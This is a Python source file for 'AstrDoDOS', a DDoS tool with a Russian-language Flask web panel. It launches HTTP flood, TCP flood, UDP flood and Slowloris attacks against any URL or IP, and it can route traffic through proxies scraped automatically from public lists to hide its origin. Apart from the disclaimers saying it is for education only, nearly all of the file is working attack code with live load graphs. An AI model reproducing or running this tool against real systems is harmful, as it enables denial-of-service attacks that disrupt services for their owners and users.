import asyncio
import aiohttp
import socket
import threading
import requests
import logging
import random
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from flask import Flask, render_template_string, request, redirect, url_for
from datetime import datetime
from typing import List, Optional
import os
import re
from werkzeug.utils import secure_filename

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('astrdodos.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Предупреждение
print("""
AstrDoDOS - Инструмент для тестирования защиты от DDoS
ВНИМАНИЕ: Этот инструмент предназначен ТОЛЬКО для образовательных целей!
Несанкционированное использование НЕЗАКОННО и может иметь серьезные последствия.
Убедитесь, что у вас есть явное разрешение от владельца системы.
Для тестов используйте локальный сервер: python3 -m http.server 8000
""")


class AstrDoDOS:
    def __init__(self):
        self.target = None
        self.port = 80
        self.threads = 10
        self.timeout = 10.0
        self.proxies = []
        self.attack_type = "http"
        self.proxy_mode = "none"  # none, auto, file
        self.running = False
        self.proxy_stats = {
            "total": 0,
            "working": 0,
            "failed": 0
        }
        self.stats = {
            "requests_sent": 0,
            "requests_success": 0,
            "requests_failed": 0,
            "start_time": None,
            "end_time": None,
            "status": "Не запущена",
            "time_series": []  # [{timestamp: int, total: int, failed: int}, ...]
        }
        self.last_log_time = 0
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        ]

    async def check_proxy(self, proxy: str, session: aiohttp.ClientSession, timeout: float = 5.0) -> Optional[str]:
        """Проверка работоспособности одного прокси."""
        try:
            async with session.get("http://ip-api.com/json", proxy=proxy, timeout=timeout) as response:
                if response.status == 200:
                    logger.info(f"Прокси {proxy} работает.")
                    return proxy
                else:
                    logger.warning(f"Прокси {proxy} не работает. Код ответа: {response.status}")
        except Exception as e:
            logger.error(f"Ошибка проверки прокси {proxy}: {e}")
        return None

    async def check_proxies(self, proxies: List[str]) -> List[str]:
        """Проверка списка прокси."""
        self.proxy_stats = {"total": len(proxies), "working": 0, "failed": 0}
        logger.info(f"Проверка {self.proxy_stats['total']} прокси...")
        working_proxies = []
        async with aiohttp.ClientSession() as session:
            tasks = [self.check_proxy(proxy, session) for proxy in proxies]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for proxy, result in zip(proxies, results):
                if isinstance(result, str):
                    working_proxies.append(result)
                    self.proxy_stats["working"] += 1
                else:
                    self.proxy_stats["failed"] += 1
        logger.info(
            f"Проверка завершена: {self.proxy_stats['working']} рабочих, {self.proxy_stats['failed']} нерабочих.")
        return working_proxies

    async def fetch_proxies(self) -> List[str]:
        """Получение списка бесплатных прокси из API."""
        if self.proxy_mode != "auto":
            return []
        sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=https"
        ]
        for source in sources:
            try:
                logger.info(f"Получение списка прокси из {source}...")
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    proxies = [f"http://{proxy}" for proxy in response.text.splitlines() if proxy.strip()]
                    logger.info(f"Получено {len(proxies)} прокси. Проверка работоспособности...")
                    return await self.check_proxies(proxies)
                else:
                    logger.warning(f"Не удалось получить прокси из {source}. Код ответа: {response.status_code}")
            except Exception as e:
                logger.error(f"Ошибка при получении прокси из {source}: {e}")
        logger.warning("Все источники прокси недоступны. Продолжение без прокси.")
        return []

    def load_proxies_from_file(self, file_path: str) -> List[str]:
        """Чтение прокси из файла."""
        try:
            with open(file_path, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            valid_proxies = [f"http://{proxy}" for proxy in proxies if
                             re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$', proxy)]
            logger.info(f"Загружено {len(valid_proxies)} прокси из файла {file_path}. Проверка работоспособности...")
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            working_proxies = loop.run_until_complete(self.check_proxies(valid_proxies))
            loop.close()
            return working_proxies
        except Exception as e:
            logger.error(f"Ошибка при чтении файла прокси: {e}")
            return []

    def update_time_series(self, success: bool):
        """Обновление данных для графика."""
        current_time = int(time.time())
        if current_time > self.last_log_time:
            self.last_log_time = current_time
            # Инициализируем новую запись
            if not self.stats["time_series"] or self.stats["time_series"][-1]["timestamp"] < current_time:
                self.stats["time_series"].append({
                    "timestamp": current_time,
                    "total": 0,
                    "failed": 0
                })
            # Обновляем последнюю запись
            self.stats["time_series"][-1]["total"] += 1
            if not success:
                self.stats["time_series"][-1]["failed"] += 1
        # Ограничиваем длину time_series (например, 60 секунд)
        if len(self.stats["time_series"]) > 60:
            self.stats["time_series"] = self.stats["time_series"][-60:]

    async def http_flood(self, session: aiohttp.ClientSession):
        """HTTP-флуд атака."""
        headers = {"User-Agent": random.choice(self.user_agents)}
        proxy = random.choice(self.proxies) if self.proxies else None
        try:
            async with session.get(self.target, headers=headers, proxy=proxy, timeout=self.timeout) as response:
                self.stats["requests_sent"] += 1
                success = 200 <= response.status < 300
                if success:
                    self.stats["requests_success"] += 1
                    logger.info(f"Успешный HTTP-запрос на {self.target}, статус: {response.status}")
                else:
                    self.stats["requests_failed"] += 1
                    logger.info(f"Неуспешный HTTP-запрос на {self.target}, статус: {response.status}")
                self.update_time_series(success)
        except Exception as e:
            self.stats["requests_sent"] += 1
            self.stats["requests_failed"] += 1
            logger.info(f"Неуспешный HTTP-запрос на {self.target}, ошибка: {e}")
            self.update_time_series(False)

    def tcp_flood(self):
        """TCP-флуд атака."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        try:
            hostname = urlparse(self.target).hostname or self.target
            sock.connect((hostname, self.port))
            while self.running:
                sock.send(b"X" * 1024)
                self.stats["requests_sent"] += 1
                self.stats["requests_success"] += 1
                logger.info(f"Успешный TCP-пакет на {self.target}:{self.port}")
                self.update_time_series(True)
                time.sleep(0.01)
        except Exception as e:
            self.stats["requests_failed"] += 1
            logger.info(f"Неуспешный TCP-пакет на {self.target}:{self.port}, ошибка: {e}")
            self.update_time_series(False)
        finally:
            sock.close()

    def udp_flood(self):
        """UDP-флуд атака."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            hostname = urlparse(self.target).hostname or self.target
            while self.running:
                sock.sendto(b"X" * 1024, (hostname, self.port))
                self.stats["requests_sent"] += 1
                self.stats["requests_success"] += 1
                logger.info(f"Успешный UDP-пакет на {self.target}:{self.port}")
                self.update_time_series(True)
                time.sleep(0.01)
        except Exception as e:
            self.stats["requests_failed"] += 1
            logger.info(f"Неуспешный UDP-пакет на {self.target}:{self.port}, ошибка: {e}")
            self.update_time_series(False)
        finally:
            sock.close()

    async def slowloris(self, session: aiohttp.ClientSession):
        """Slowloris атака."""
        headers = {"User-Agent": random.choice(self.user_agents), "Connection": "keep-alive"}
        proxy = random.choice(self.proxies) if self.proxies else None
        try:
            async with session.get(self.target, headers=headers, proxy=proxy, timeout=self.timeout) as response:
                self.stats["requests_sent"] += 1
                success = 200 <= response.status < 300
                if success:
                    self.stats["requests_success"] += 1
                    logger.info(f"Успешный Slowloris-запрос на {self.target}, статус: {response.status}")
                else:
                    self.stats["requests_failed"] += 1
                    logger.info(f"Неуспешный Slowloris-запрос на {self.target}, статус: {response.status}")
                self.update_time_series(success)
                while self.running:
                    await asyncio.sleep(1)
                    logger.debug(f"Slowloris удерживает соединение с {self.target}")
        except Exception as e:
            self.stats["requests_failed"] += 1
            logger.info(f"Неуспешный Slowloris-запрос на {self.target}, ошибка: {e}")
            self.update_time_series(False)

    async def attack(self):
        """Основной цикл атаки."""
        self.stats["start_time"] = datetime.now()
        self.stats["status"] = "Запущена"
        self.last_log_time = int(time.time())
        if self.proxy_mode == "auto":
            self.proxies = await self.fetch_proxies()
        elif self.proxy_mode == "file":
            self.proxies = self.load_proxies_from_file("proxies.txt")
        else:
            self.proxies = []
        if not self.proxies and self.proxy_mode != "none":
            logger.warning("Нет рабочих прокси. Продолжение без прокси.")
            self.proxy_mode = "none"
        self.running = True
        async with aiohttp.ClientSession() as session:
            tasks = []
            if self.attack_type == "http":
                tasks = [self.http_flood(session) for _ in range(self.threads)]
            elif self.attack_type == "slowloris":
                tasks = [self.slowloris(session) for _ in range(self.threads)]
            elif self.attack_type in ["tcp", "udp"]:
                with ThreadPoolExecutor(max_workers=self.threads) as executor:
                    for _ in range(self.threads):
                        if self.attack_type == "tcp":
                            executor.submit(self.tcp_flood)
                        else:
                            executor.submit(self.udp_flood)
                return
            else:
                logger.error(f"Неверный тип атаки: {self.attack_type}")
                self.stats["status"] = "Ошибка: Неверный тип атаки"
                return
            await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["end_time"] = datetime.now()
        self.stats["status"] = "Завершена"

    def start(self):
        """Запуск атаки."""
        logger.info(
            f"Запуск атаки на {self.target} с {self.threads} потоками ({self.attack_type}, прокси: {self.proxy_mode})")
        try:
            asyncio.run(self.attack())
        except KeyboardInterrupt:
            self.running = False
            logger.info("Атака остановлена пользователем.")
            self.stats["status"] = "Остановлена пользователем"
        except Exception as e:
            logger.error(f"Ошибка атаки: {e}")
            self.stats["status"] = f"Ошибка: {str(e)}"
        finally:
            self.stats["end_time"] = datetime.now()

    def stop(self):
        """Остановка атаки."""
        self.running = False
        self.stats["status"] = "Остановлена"
        self.stats["end_time"] = datetime.now()
        logger.info("Атака остановлена через веб-интерфейс.")


# Flask веб-сервер
app = Flask(__name__)
ddos_instance = AstrDoDOS()
UPLOAD_FOLDER = os.path.join(os.getcwd(), 'Uploads')
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AstrDoDOS - Тестирование DDoS</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #333; }
        .warning { color: red; font-weight: bold; margin-bottom: 20px; }
        .form-container { margin-bottom: 20px; }
        .form-container input, .form-container select { margin: 5px; padding: 5px; }
        .form-container button { padding: 10px; background: #007bff; color: white; border: none; cursor: pointer; }
        .form-container button:hover { background: #0056b3; }
        .stop-button { background: #dc3545; }
        .stop-button:hover { background: #c82333; }
        .stats { margin-top: 20px; }
        .stats p { margin: 5px 0; }
        pre { background: #f4f4f4; padding: 10px; border-radius: 5px; max-height: 400px; overflow-y: auto; }
        .error { color: red; }
        .countdown { font-weight: bold; color: green; }
        #proxy_file { display: none; }
        .chart-container { width: 100%; max-width: 800px; margin: 20px 0; }
    </style>
    <script>
        function startCountdown() {
            let seconds = 10;
            const countdownDiv = document.getElementById('countdown');
            countdownDiv.innerHTML = 'Атака начнется через 10 секунд...';
            const interval = setInterval(() => {
                seconds--;
                countdownDiv.innerHTML = `Осталось ${seconds} секунд...`;
                if (seconds <= 0) {
                    clearInterval(interval);
                    document.getElementById('attack-form').submit();
                }
            }, 1000);
        }
        function toggleProxyFile() {
            const proxyMode = document.getElementById('proxy_mode').value;
            const proxyFileInput = document.getElementById('proxy_file');
            proxyFileInput.style.display = proxyMode === 'file' ? 'block' : 'none';
            if (proxyMode !== 'file') {
                proxyFileInput.value = '';
            }
        }
        window.onload = function() {
            const timeSeries = {{ time_series | tojson }};
            const labels = timeSeries.map(data => new Date(data.timestamp * 1000).toLocaleTimeString());
            const totalData = timeSeries.map(data => data.total);
            const failedData = timeSeries.map(data => data.failed);
            const ctx = document.getElementById('loadChart').getContext('2d');
            new Chart(ctx, {
                type: 'line',
                data: {
                    labels: labels,
                    datasets: [
                        {
                            label: 'Общая нагрузка (запросов/с)',
                            data: totalData,
                            borderColor: 'blue',
                            fill: false
                        },
                        {
                            label: 'Неуспешные запросы (запросов/с)',
                            data: failedData,
                            borderColor: 'red',
                            fill: false
                        }
                    ]
                },
                options: {
                    scales: {
                        y: {
                            beginAtZero: true,
                            title: { display: true, text: 'Запросов в секунду' }
                        },
                        x: {
                            title: { display: true, text: 'Время' }
                        }
                    }
                }
            });
        };
    </script>
</head>
<body>
    <h1>AstrDoDOS - Тестирование DDoS</h1>
    <div class="warning">
        ВНИМАНИЕ: Этот инструмент предназначен ТОЛЬКО для образовательных целей!<br>
        Несанкционированное использование НЕЗАКОННО. Используйте только с явным разрешением владельца системы.<br>
        Для тестов запустите локальный сервер: <code>python3 -m http.server 8000</code> и используйте http://localhost:8000
    </div>
    <div class="form-container">
        <h2>Настройка атаки</h2>
        {% if error %}
            <p class="error">{{ error }}</p>
        {% endif %}
        {% if countdown %}
            <p class="countdown" id="countdown">Атака начнется через 10 секунд...</p>
            <script>startCountdown();</script>
        {% endif %}
        <form id="attack-form" method="POST" action="{% if countdown %}/run_attack{% else %}/start_attack{% endif %}" enctype="multipart/form-data">
            <label>Цель (URL или IP, например, http://localhost:8000):</label><br>
            <input type="text" name="target" value="{{ stats.target | default('http://localhost:8000') }}" required><br>
            <label>Порт (1–65535):</label><br>
            <input type="number" name="port" value="{{ stats.port | default(80) }}" min="1" max="65535" required><br>
            <label>Количество потоков (рекомендуется 10):</label><br>
            <input type="number" name="threads" value="{{ stats.threads | default(10) }}" min="1" required><br>
            <label>Таймаут (секунды):</label><br>
            <input type="number" name="timeout" value="{{ stats.timeout | default(10.0) }}" step="0.1" min="0.1" required><br>
            <label>Тип атаки:</label><br>
            <select name="attack_type">
                <option value="http" {% if stats.attack_type == 'http' %}selected{% endif %}>HTTP Flood</option>
                <option value="tcp" {% if stats.attack_type == 'tcp' %}selected{% endif %}>TCP Flood</option>
                <option value="udp" {% if stats.attack_type == 'udp' %}selected{% endif %}>UDP Flood</option>
                <option value="slowloris" {% if stats.attack_type == 'slowloris' %}selected{% endif %}>Slowloris</option>
            </select><br>
            <label>Режим прокси:</label><br>
            <select name="proxy_mode" id="proxy_mode" onchange="toggleProxyFile()">
                <option value="none" {% if stats.proxy_mode == 'none' %}selected{% endif %}>Без прокси</option>
                <option value="auto" {% if stats.proxy_mode == 'auto' %}selected{% endif %}>Автоматические прокси</option>
                <option value="file" {% if stats.proxy_mode == 'file' %}selected{% endif %}>Свой файл прокси</option>
            </select><br>
            <input type="file" name="proxy_file" id="proxy_file" accept=".txt"><br>
            <button type="submit">Запустить атаку</button>
        </form>
        {% if stats.status == 'Запущена' %}
            <form method="POST" action="/stop_attack">
                <button type="submit" class="stop-button">Остановить атаку</button>
            </form>
        {% endif %}
    </div>
    <div class="stats">
        <h2>Статистика</h2>
        <p><strong>Цель:</strong> {{ stats.target | default('Нет') }}</p>
        <p><strong>Тип атаки:</strong> {{ stats.attack_type | default('Нет') }}</p>
        <p><strong>Режим прокси:</strong> {{ stats.proxy_mode | default('Нет') }}</p>
        <p><strong>Прокси (всего/рабочих/нерабочих):</strong> {{ proxy_stats.total }}/{{ proxy_stats.working }}/{{ proxy_stats.failed }}</p>
        <p><strong>Потоки:</strong> {{ stats.threads }}</p>
        <p><strong>Статус:</strong> {{ stats.status }}</p>
        <p><strong>Отправлено запросов:</strong> {{ stats.requests_sent }}</p>
        <p><strong>Успешных запросов:</strong> {{ stats.requests_success }}</p>
        <p><strong>Неуспешных запросов:</strong> {{ stats.requests_failed }}</p>
        <p><strong>Время начала:</strong> {{ stats.start_time | default('Нет') }}</p>
        <p><strong>Время окончания:</strong> {{ stats.end_time | default('Нет') }}</p>
    </div>
    <div class="chart-container">
        <h2>График нагрузки</h2>
        <canvas id="loadChart"></canvas>
    </div>
    <h2>Логи</h2>
    <pre>{{ logs }}</pre>
</body>
</html>
"""


def validate_target(target):
    """Валидация цели (URL или IP)."""
    url_pattern = re.compile(r'^https?://[a-zA-Z0-9][a-zA-Z0-9.-]*\.[a-zA-Z]{2,}(?::\d+)?(?:/.*)?$')
    ip_pattern = re.compile(
        r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
    return url_pattern.match(target) or ip_pattern.match(target)


def validate_port(port):
    """Валидация порта."""
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False


@app.route('/', methods=['GET'])
def index():
    try:
        with open('astrdodos.log', 'r') as f:
            logs = f.read()
    except FileNotFoundError:
        logs = "Логи пока недоступны."
    return render_template_string(
        HTML_TEMPLATE,
        stats={
            'target': ddos_instance.target,
            'port': ddos_instance.port,
            'threads': ddos_instance.threads,
            'timeout': ddos_instance.timeout,
            'attack_type': ddos_instance.attack_type,
            'proxy_mode': ddos_instance.proxy_mode,
            'requests_sent': ddos_instance.stats['requests_sent'],
            'requests_success': ddos_instance.stats['requests_success'],
            'requests_failed': ddos_instance.stats['requests_failed'],
            'status': ddos_instance.stats['status'],
            'start_time': ddos_instance.stats['start_time'].strftime('%Y-%m-%d %H:%M:%S') if ddos_instance.stats[
                'start_time'] else 'N/A',
            'end_time': ddos_instance.stats['end_time'].strftime('%Y-%m-%d %H:%M:%S') if ddos_instance.stats[
                'end_time'] else 'N/A'
        },
        proxy_stats=ddos_instance.proxy_stats,
        time_series=ddos_instance.stats['time_series'],
        logs=logs,
        error=None,
        countdown=False
    )


@app.route('/start_attack', methods=['POST'])
def start_attack():
    target = request.form.get('target')
    port = request.form.get('port')
    threads = request.form.get('threads')
    timeout = request.form.get('timeout')
    attack_type = request.form.get('attack_type')
    proxy_mode = request.form.get('proxy_mode')
    proxy_file = request.files.get('proxy_file')

    # Валидация
    if not validate_target(target):
        return render_template_string(
            HTML_TEMPLATE,
            stats=ddos_instance.stats,
            proxy_stats=ddos_instance.proxy_stats,
            time_series=ddos_instance.stats['time_series'],
            logs="Ошибка: Некорректный URL или IP.",
            error="Введите корректный URL (http://example.com) или IP (1.2.3.4)",
            countdown=False
        )
    if not validate_port(port):
        return render_template_string(
            HTML_TEMPLATE,
            stats=ddos_instance.stats,
            proxy_stats=ddos_instance.proxy_stats,
            time_series=ddos_instance.stats['time_series'],
            logs="Ошибка: Некорректный порт.",
            error="Порт должен быть числом от 1 до 65535",
            countdown=False
        )
    try:
        threads = int(threads)
        if threads < 1:
            raise ValueError
    except ValueError:
        return render_template_string(
            HTML_TEMPLATE,
            stats=ddos_instance.stats,
            proxy_stats=ddos_instance.proxy_stats,
            time_series=ddos_instance.stats['time_series'],
            logs="Ошибка: Некорректное количество потоков.",
            error="Потоки должны быть целым числом >= 1",
            countdown=False
        )
    try:
        timeout = float(timeout)
        if timeout < 0.1:
            raise ValueError
    except ValueError:
        return render_template_string(
            HTML_TEMPLATE,
            stats=ddos_instance.stats,
            proxy_stats=ddos_instance.proxy_stats,
            time_series=ddos_instance.stats['time_series'],
            logs="Ошибка: Некорректный таймаут.",
            error="Таймаут должен быть числом >= 0.1",
            countdown=False
        )
    if attack_type not in ["http", "tcp", "udp", "slowloris"]:
        return render_template_string(
            HTML_TEMPLATE,
            stats=ddos_instance.stats,
            proxy_stats=ddos_instance.proxy_stats,
            time_series=ddos_instance.stats['time_series'],
            logs="Ошибка: Неверный тип атаки.",
            error="Выберите корректный тип атаки (http, tcp, udp, slowloris)",
            countdown=False
        )
    if proxy_mode not in ["none", "auto", "file"]:
        return render_template_string(
            HTML_TEMPLATE,
            stats=ddos_instance.stats,
            proxy_stats=ddos_instance.proxy_stats,
            time_series=ddos_instance.stats['time_series'],
            logs="Ошибка: Неверный режим прокси.",
            error="Выберите корректный режим прокси (без прокси, автоматические, свой файл)",
            countdown=False
        )
    if proxy_mode == "file" and (not proxy_file or not proxy_file.filename.endswith('.txt')):
        return render_template_string(
            HTML_TEMPLATE,
            stats=ddos_instance.stats,
            proxy_stats=ddos_instance.proxy_stats,
            time_series=ddos_instance.stats['time_series'],
            logs="Ошибка: Не загружен файл прокси или неверный формат.",
            error="Выберите файл .txt с прокси в формате ip:port (по одному на строку)",
            countdown=False
        )

    # Сохранение файла прокси
    if proxy_mode == "file" and proxy_file:
        filename = secure_filename(proxy_file.filename)
        proxy_file.save(os.path.join(app.config['UPLOAD_FOLDER'], 'proxies.txt'))

    # Установка параметров
    ddos_instance.target = target
    ddos_instance.port = int(port)
    ddos_instance.threads = threads
    ddos_instance.timeout = timeout
    ddos_instance.attack_type = attack_type
    ddos_instance.proxy_mode = proxy_mode
    ddos_instance.stats["time_series"] = []  # Сброс графика перед новой атакой

    # Показать отсчет
    try:
        with open('astrdodos.log', 'r') as f:
            logs = f.read()
    except FileNotFoundError:
        logs = "Логи пока недоступны."
    return render_template_string(
        HTML_TEMPLATE,
        stats=ddos_instance.stats,
        proxy_stats=ddos_instance.proxy_stats,
        time_series=ddos_instance.stats['time_series'],
        logs=logs,
        error=None,
        countdown=True
    )


@app.route('/run_attack', methods=['POST'])
def run_attack():
    # Запуск атаки в отдельном потоке
    def attack_thread():
        ddos_instance.start()

    threading.Thread(target=attack_thread, daemon=True).start()
    return redirect(url_for('index'))


@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    ddos_instance.stop()
    return redirect(url_for('index'))


def run_flask():
    """Запуск Flask сервера."""
    app.run(host='0.0.0.0', port=5002, debug=False)


if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    try:
        while True:
            time.sleep(1)  # Держим основной поток активным
    except KeyboardInterrupt:
        print("Завершение работы...")
